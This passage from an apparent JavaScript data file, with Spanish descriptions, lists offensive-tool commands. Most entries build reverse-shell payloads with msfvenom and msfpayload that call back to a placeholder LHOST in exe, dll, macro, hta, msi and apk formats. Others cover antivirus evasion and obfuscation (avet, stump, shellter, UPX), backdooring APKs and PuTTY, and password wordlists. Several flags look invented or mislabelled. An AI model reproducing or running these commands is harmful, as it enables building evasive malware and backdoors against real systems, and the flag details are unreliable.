    "cmd": "oledump.py -s 3 documento.doc",
    "desc": "Stream 3"
   },
   {
    "cmd": "oledump.py -s 3 -d documento.doc",
    "desc": "Decodificar stream"
   },
   {
    "cmd": "oledump.py -s 3 -v documento.doc",
    "desc": "Ver VBA"
   },
   {
    "cmd": "oledump.py -s 3 -c documento.doc",
    "desc": "Con contexto"
   },
   {
    "cmd": "oledump.py -s 3 -p documento.doc",
    "desc": "Prueba de paridad"
   },
   {
    "cmd": "oledump.py -s 3 -a documento.doc",
    "desc": "ASCII dump"
   },
   {
    "cmd": "oledump.py -s 3 -H documento.doc",
    "desc": "Hexdump"
   },
   {
    "cmd": "oledump.py -s 3 -l documento.doc",
    "desc": "Longitud"
   },
   {
    "cmd": "oledump.py -S documento.doc",
    "desc": "Resumen de streams"
   },
   {
    "cmd": "oledump.py -f documento.doc",
    "desc": "Firmas"
   },
   {
    "cmd": "oledump.py -m documento.doc",
    "desc": "Malformed check"
   },
   {
    "cmd": "oledump.py -o documento.doc",
    "desc": "Con oledump manifest"
   },
   {
    "cmd": "oledump.py -q documento.doc",
    "desc": "Quiet"
   },
   {
    "cmd": "oledump.py -x documento.doc",
    "desc": "Extraer streams"
   }
  ]
 },
 {
  "tool": "stump",
  "desc": "Ofuscador de payloads Windows (CMD/Powershell)",
  "commands": [
   {
    "cmd": "stump payload.bat out.bat",
    "desc": "Ofuscar batch"
   },
   {
    "cmd": "stump payload.ps1 out.ps1",
    "desc": "Ofuscar powershell"
   },
   {
    "cmd": "stump -l payload.bat out.bat",
    "desc": "Low complexity"
   },
   {
    "cmd": "stump -h payload.bat out.bat",
    "desc": "High complexity"
   },
   {
    "cmd": "stump -m payload.bat out.bat",
    "desc": "Medium"
   },
   {
    "cmd": "stump -x payload.bat out.bat",
    "desc": "Extreme"
   },
   {
    "cmd": "stump -e payload.bat out.bat",
    "desc": "Con encoders"
   },
   {
    "cmd": "stump -v payload.bat out.bat",
    "desc": "Verbose"
   },
   {
    "cmd": "stump -o out.bat payload.bat",
    "desc": "Orden de args"
   },
   {
    "cmd": "stump -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "avet",
  "desc": "Antivirus Evasion Tool (compila payloads evasivos)",
  "commands": [
   {
    "cmd": "avet_fabricate.py",
    "desc": "Abrir menú de fabricación"
   },
   {
    "cmd": "avet_fabricate.py -i",
    "desc": "Modo interactivo"
   },
   {
    "cmd": "avet_fabricate.py -l",
    "desc": "Listar builds"
   },
   {
    "cmd": "avet_fabricate.py -c config",
    "desc": "Con config"
   },
   {
    "cmd": "avet_fabricate.py -s shellcode.raw",
    "desc": "Con shellcode"
   },
   {
    "cmd": "avet_fabricate.py -x exe",
    "desc": "Output exe"
   },
   {
    "cmd": "avet_fabricate.py -v",
    "desc": "Verbose"
   },
   {
    "cmd": "avet_fabricate.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "fatrat",
  "desc": "TheFatRat - generador de payloads y backdoors",
  "commands": [
   {
    "cmd": "fatrat",
    "desc": "Abrir menú"
   },
   {
    "cmd": "fatrat -u archivo",
    "desc": "Usar config"
   },
   {
    "cmd": "fatrat -c",
    "desc": "Custom payload"
   },
   {
    "cmd": "fatrat -p",
    "desc": "Payloads"
   },
   {
    "cmd": "fatrat -e",
    "desc": "Evasion"
   },
   {
    "cmd": "fatrat -v",
    "desc": "Verbose"
   },
   {
    "cmd": "fatrat -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "wine",
  "desc": "Ejecutar binarios Windows en Linux (para análisis)",
  "commands": [
   {
    "cmd": "wine programa.exe",
    "desc": "Ejecutar exe"
   },
   {
    "cmd": "wine64 programa.exe",
    "desc": "64-bit"
   },
   {
    "cmd": "wine cmd /c dir",
    "desc": "Consola"
   },
   {
    "cmd": "wine regedit",
    "desc": "Registro"
   },
   {
    "cmd": "wine explorer.exe",
    "desc": "Explorer"
   },
   {
    "cmd": "wine tasklist",
    "desc": "Procesos"
   },
   {
    "cmd": "wine --version",
    "desc": "Versión"
   },
   {
    "cmd": "winecfg",
    "desc": "Config"
   },
   {
    "cmd": "WINEPREFIX=/tmp/wine wine programa.exe",
    "desc": "Prefix custom"
   },
   {
    "cmd": "wineboot -u",
    "desc": "Actualizar prefix"
   }
  ]
 },
 {
  "tool": "mingw-w64",
  "desc": "Cross-compiler Windows (gcc-mingw-w64)",
  "commands": [
   {
    "cmd": "x86_64-w64-mingw32-gcc -o shell.exe shell.c",
    "desc": "Compilar exe"
   },
   {
    "cmd": "x86_64-w64-mingw32-gcc -static -o shell.exe shell.c",
    "desc": "Estático"
   },
   {
    "cmd": "x86_64-w64-mingw32-gcc -s -o shell.exe shell.c",
    "desc": "Sin símbolos"
   },
   {
    "cmd": "i686-w64-mingw32-gcc -o shell32.exe shell.c",
    "desc": "32-bit"
   },
   {
    "cmd": "x86_64-w64-mingw32-gcc -mwindows -o app.exe app.c",
    "desc": "Sin consola"
   },
   {
    "cmd": "x86_64-w64-mingw32-gcc -lws2_32 -o s.exe socket.c",
    "desc": "Con winsock"
   },
   {
    "cmd": "x86_64-w64-mingw32-gcc -lwininet -o s.exe http.c",
    "desc": "Con wininet"
   },
   {
    "cmd": "x86_64-w64-mingw32-gcc -O2 -o shell.exe shell.c",
    "desc": "Optimizado"
   },
   {
    "cmd": "x86_64-w64-mingw32-g++ -o app.exe app.cpp",
    "desc": "C++"
   },
   {
    "cmd": "x86_64-w64-mingw32-strip shell.exe",
    "desc": "Stripped"
   }
  ]
 },
 {
  "tool": "backdoor-apk",
  "desc": "Inyectar payload Meterpreter en APKs",
  "commands": [
   {
    "cmd": "backdoor-apk.sh original.apk",
    "desc": "Inyectar"
   },
   {
    "cmd": "backdoor-apk.sh -i original.apk",
    "desc": "Interactivo"
   },
   {
    "cmd": "backdoor-apk.sh -n 1 -i original.apk",
    "desc": "Nombre custom"
   },
   {
    "cmd": "backdoor-apk.sh -a x86 original.apk",
    "desc": "Arquitectura"
   },
   {
    "cmd": "backdoor-apk.sh -p 443 original.apk",
    "desc": "Puerto"
   },
   {
    "cmd": "backdoor-apk.sh -h original.apk",
    "desc": "Host"
   },
   {
    "cmd": "backdoor-apk.sh -d original.apk",
    "desc": "Debug"
   },
   {
    "cmd": "backdoor-apk.sh -t original.apk",
    "desc": "Test"
   },
   {
    "cmd": "backdoor-apk.sh -k original.apk",
    "desc": "Keep original"
   },
   {
    "cmd": "backdoor-apk.sh --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "msfpayload",
  "desc": "Generador de payloads Metasploit (legacy)",
  "commands": [
   {
    "cmd": "msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R",
    "desc": "Raw"
   },
   {
    "cmd": "msfpayload linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 X",
    "desc": "ELF"
   },
   {
    "cmd": "msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 EXE > s.exe",
    "desc": "EXE"
   },
   {
    "cmd": "msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 PSH > s.ps1",
    "desc": "PowerShell"
   },
   {
    "cmd": "msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 C",
    "desc": "C array"
   },
   {
    "cmd": "msfpayload linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 C",
    "desc": "C shellcode"
   },
   {
    "cmd": "msfpayload windows/meterpreter/reverse_https LHOST=IP LPORT=443 EXE > s.exe",
    "desc": "HTTPS"
   },
   {
    "cmd": "msfpayload java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 WAR",
    "desc": "WAR"
   },
   {
    "cmd": "msfpayload php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 R",
    "desc": "PHP"
   },
   {
    "cmd": "msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 VBS",
    "desc": "VBS"
   },
   {
    "cmd": "msfpayload python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R",
    "desc": "Python"
   },
   {
    "cmd": "msfpayload windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 EXE > s.exe",
    "desc": "x64"
   },
   {
    "cmd": "msfpayload -l",
    "desc": "Listar payloads"
   },
   {
    "cmd": "msfpayload -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "shellter",
  "desc": "Dynamic shellcode injection en PE (avanzado)",
  "commands": [
   {
    "cmd": "shellter -a -f putty.exe -p shellcode.raw",
    "desc": "Inyectar"
   },
   {
    "cmd": "shellter -a -f putty.exe -e x86/shikata_ga_nai",
    "desc": "Con encoder"
   },
   {
    "cmd": "shellter -a -f putty.exe -p raw -x -i 3",
    "desc": "Iteraciones"
   },
   {
    "cmd": "shellter -a -f putty.exe -d",
    "desc": "Debug"
   },
   {
    "cmd": "shellter -a -f putty.exe -n",
    "desc": "No PE checks"
   },
   {
    "cmd": "shellter -a -f putty.exe -t",
    "desc": "Test"
   },
   {
    "cmd": "shellter -a -f putty.exe -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "gcc-payloads",
  "desc": "Compilar payloads C con gcc",
  "commands": [
   {
    "cmd": "gcc -o payload payload.c",
    "desc": "Compilar"
   },
   {
    "cmd": "gcc -static -o payload payload.c",
    "desc": "Estático"
   },
   {
    "cmd": "gcc -s -o payload payload.c",
    "desc": "Sin símbolos"
   },
   {
    "cmd": "gcc -o payload payload.c -lpthread",
    "desc": "Con pthread"
   },
   {
    "cmd": "gcc -o payload payload.c -lsocket",
    "desc": "Socket"
   },
   {
    "cmd": "gcc -m32 -o payload payload.c",
    "desc": "32-bit"
   },
   {
    "cmd": "gcc -o payload payload.c -no-pie",
    "desc": "Sin PIE"
   },
   {
    "cmd": "gcc -o payload payload.c -z execstack",
    "desc": "Stack exec"
   },
   {
    "cmd": "gcc -o payload payload.c -fno-stack-protector",
    "desc": "Sin canary"
   },
   {
    "cmd": "gcc -g -o payload payload.c",
    "desc": "Con debug"
   },
   {
    "cmd": "gcc -O2 -o payload payload.c",
    "desc": "Optimizado"
   },
   {
    "cmd": "gcc -o payload payload.c -DIP='\"10.0.0.1\"'",
    "desc": "Definir IP"
   },
   {
    "cmd": "gcc -o payload payload.c -DPORT=4444",
    "desc": "Definir puerto"
   },
   {
    "cmd": "gcc -o shellcode -nostdlib -static shellcode.c",
    "desc": "Shellcode"
   },
   {
    "cmd": "gcc -Wall -o payload payload.c",
    "desc": "Warnings"
   }
  ]
 },
 {
  "tool": "msfvenom-extra",
  "desc": "Generación de payloads (variantes adicionales)",
  "commands": [
   {
    "cmd": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -b '\\x00'",
    "desc": "Evitar null bytes"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o s.exe -n 10",
    "desc": "Con sled"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -i 8 -e x86/countdown",
    "desc": "Encoder countdown"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe --platform windows -a x86 -e x86/jmp_call_additive -i 5",
    "desc": "Jmp call"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vba-psh",
    "desc": "VBA PS"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh-reflection",
    "desc": "PS reflection"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f hta-psh",
    "desc": "HTA"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o s.dll",
    "desc": "DLL"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vbs -o s.vbs",
    "desc": "VBS"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -e x64/xor -i 5",
    "desc": "XOR encoder"
   },
   {
    "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o sc.bin -a x64",
    "desc": "Shellcode x64"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f csharp",
    "desc": "C#"
   },
   {
    "cmd": "msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o evil.apk -e x86/shikata_ga_nai",
    "desc": "APK"
   },
   {
    "cmd": "msfvenom --list payloads | grep reverse",
    "desc": "Listar"
   },
   {
    "cmd": "msfvenom --list encoders",
    "desc": "Encoders"
   }
  ]
 },
 {
  "tool": "searchsploit-extra",
  "desc": "Búsqueda de exploits (variantes)",
  "commands": [
   {
    "cmd": "searchsploit apache 2.4.49",
    "desc": "Buscar"
   },
   {
    "cmd": "searchsploit -w apache",
    "desc": "Con URLs"
   },
   {
    "cmd": "searchsploit -c apache",
    "desc": "Case sensitive"
   },
   {
    "cmd": "searchsploit -e apache",
    "desc": "Exact"
   },
   {
    "cmd": "searchsploit -t 'WordPress Plugin'",
    "desc": "Título"
   },
   {
    "cmd": "searchsploit wordpress | head -20",
    "desc": "Filtrar"
   },
   {
    "cmd": "searchsploit -m 50383",
    "desc": "Copiar exploit"
   },
   {
    "cmd": "searchsploit -p 50383",
    "desc": "Path completo"
   },
   {
    "cmd": "searchsploit --nmap out.xml",
    "desc": "Nmap results"
   },
   {
    "cmd": "searchsploit --exclude dos apache",
    "desc": "Excluir"
   },
   {
    "cmd": "searchsploit -j apache",
    "desc": "JSON"
   },
   {
    "cmd": "searchsploit -o apache",
    "desc": "Salida"
   },
   {
    "cmd": "searchsploit --update",
    "desc": "Actualizar"
   },
   {
    "cmd": "searchsploit -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "shellcode-dev",
  "desc": "Desarrollo y extracción de shellcode",
  "commands": [
   {
    "cmd": "nasm -f elf64 shell.asm -o shell.o",
    "desc": "Ensamblar"
   },
   {
    "cmd": "ld -o shell shell.o",
    "desc": "Linkear"
   },
   {
    "cmd": "objdump -d shell | grep -Po '\\t[0-9a-f]{2} ' | tr -d '\\n\\t ' | sed 's/../\\x&/g'",
    "desc": "Extraer bytes"
   },
   {
    "cmd": "python3 -c 'import binascii; print(binascii.hexlify(open(\"/tmp/shell\",\"rb\").read()))'",
    "desc": "Hex dump"
   },
   {
    "cmd": "msfvenom -p linux/x64/exec CMD=/bin/sh -f python",
    "desc": "MSF shellcode"
   },
   {
    "cmd": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f c",
    "desc": "C shellcode"
   },
   {
    "cmd": "python3 -c 's=b\"\\x48\\x31\\xc0\"; print(len(s), \"bytes\")'",
    "desc": "Medir"
   },
   {
    "cmd": "shellter -a -pe /tmp/notepad.exe",
    "desc": "Shellter"
   },
   {
    "cmd": "unicorn python payload.py",
    "desc": "Unicorn"
   },
   {
    "cmd": "donut -f /tmp/payload.exe -o /tmp/payload.bin",
    "desc": "Donut"
   },
   {
    "cmd": "xxd -i /tmp/shell | head -30",
    "desc": "XXD C array"
   },
   {
    "cmd": "gdb -batch -ex 'x/20i main' ./shell",
    "desc": "Disas gdb"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f csharp -o sc.cs",
    "desc": "C# code"
   },
   {
    "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f perl -o sc.pl",
    "desc": "Perl code"
   }
  ]
 },
 {
  "tool": "packers-utils",
  "desc": "Empaquetado y ofuscación de binarios",
  "commands": [
   {
    "cmd": "upx -9 payload.exe -o packed.exe",
    "desc": "UPX"
   },
   {
    "cmd": "upx -d packed.exe -o unpacked.exe",
    "desc": "Desempaquetar"
   },
   {
    "cmd": "upx -t packed.exe",
    "desc": "Test"
   },
   {
    "cmd": "upx -l packed.exe",
    "desc": "Listar"
   },
   {
    "cmd": "upx --best payload.exe",
    "desc": "Mejor compresión"
   },
   {
    "cmd": "upx --brute payload.exe",
    "desc": "Brute"
   },
   {
    "cmd": "strip payload",
    "desc": "Strip"
   },
   {
    "cmd": "sstrip payload",
    "desc": "Sstrip"
   },
   {
    "cmd": "gzip -9 payload",
    "desc": "Gzip"
   },
   {
    "cmd": "gzexe payload",
    "desc": "Gzexe"
   },
   {
    "cmd": "shc -f script.sh -o script.bin",
    "desc": "SHC"
   },
   {
    "cmd": "shc -f script.sh -r -v",
    "desc": "Relocable"
   },
   {
    "cmd": "chmod +x script.bin && ./script.bin",
    "desc": "Ejecutar"
   },
   {
    "cmd": "python3 -m zipapp mydir -o app.pyz",
    "desc": "Zipapp"
   },
   {
    "cmd": "obfuscator-io-cli -o out.js in.js",
    "desc": "JS obfuscate"
   }
  ]
 },
 {
  "tool": "payload-frameworks",
  "desc": "Generadores de payloads alternativos",
  "commands": [
   {
    "cmd": "msfvenom --list formats | head -20",
    "desc": "Formatos"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o /tmp/raw.bin",
    "desc": "Raw"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi",
    "desc": "MSI"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh-cmd -o cmd.ps1",
    "desc": "PSH cmd"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f macro -o macro.vba",
    "desc": "Macro"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f hex",
    "desc": "Hex"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f python",
    "desc": "Python"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f bash",
    "desc": "Bash"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f powershell -o ps.ps1",
    "desc": "Powershell"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe-service -o svc.exe",
    "desc": "Exe service"
   },
   {
    "cmd": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f macho -o evil.macho",
    "desc": "macOS"
   },
   {
    "cmd": "msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o app.raw",
    "desc": "Android raw"
   },
   {
    "cmd": "sharpshooter",
    "desc": "SharpShooter"
   },
   {
    "cmd": "unicorn",
    "desc": "Unicorn"
   },
   {
    "cmd": "veil",
    "desc": "Veil"
   },
   {
    "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o evil.war",
    "desc": "JSP war"
   }
  ]
 },
 {
  "tool": "cewl",
  "desc": "Generación de wordlists desde sitios web",
  "commands": [
   {
    "cmd": "cewl http://objetivo.com -w words.txt",
    "desc": "Generar"
   },
   {
    "cmd": "cewl http://objetivo.com -m 6",
    "desc": "Min length"
   },
   {
    "cmd": "cewl http://objetivo.com -d 3",
    "desc": "Profundidad"
   },
   {
    "cmd": "cewl http://objetivo.com -c",
    "desc": "Con count"
   },
   {
    "cmd": "cewl http://objetivo.com -e",
    "desc": "Emails"
   },
   {
    "cmd": "cewl http://objetivo.com -a",
    "desc": "Meta"
   },
   {
    "cmd": "cewl http://objetivo.com --with-numbers",
    "desc": "Con números"
   },
   {
    "cmd": "cewl http://objetivo.com -u UA",
    "desc": "User agent"
   },
   {
    "cmd": "cewl http://objetivo.com -o out.txt",
    "desc": "Ordenado"
   },
   {
    "cmd": "cewl http://objetivo.com -w out.txt --lowercase",
    "desc": "Minúsculas"
   },
   {
    "cmd": "cewl -k /tmp/cookies.txt http://objetivo.com -w out.txt",
    "desc": "Cookies"
   },
   {
    "cmd": "cewl --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "crunch",
  "desc": "Generador de wordlists (máscaras)",
  "commands": [
   {
    "cmd": "crunch 4 4 abc123 -o wl.txt",
    "desc": "Charset"
   },
   {
    "cmd": "crunch 8 8 abc123 -p palabra1 palabra2",
    "desc": "Permutaciones"
   },
   {
    "cmd": "crunch 4 6 0123456789 -o wl.txt",
    "desc": "Números"
   },
   {
    "cmd": "crunch 6 6 -t Pass%% -p abcd1234",
    "desc": "Patrón"
   },
   {
    "cmd": "crunch 8 8 -t @@@@@@@@ -l @@@@@@@@ -p pass",
    "desc": "Posición"
   },
   {
    "cmd": "crunch 4 4 abc -b 10mb -o wl.txt",
    "desc": "Limite"
   },
   {
    "cmd": "crunch 5 5 -t ^@##",
    "desc": "Símbolos"
   },
   {
    "cmd": "crunch 4 4 abc -z gzip -o wl.txt.gz",
    "desc": "Comprimir"
   },
   {
    "cmd": "crunch 3 3 -f /usr/share/crunch/charset.lst numeric -o wl.txt",
    "desc": "Charset file"
   },
   {
    "cmd": "crunch 8 8 -t @@@@@@@@%",
    "desc": "Con dígito final"
   },
   {
    "cmd": "crunch --help",
    "desc": "Ayuda"
   }
  ]
 }
];
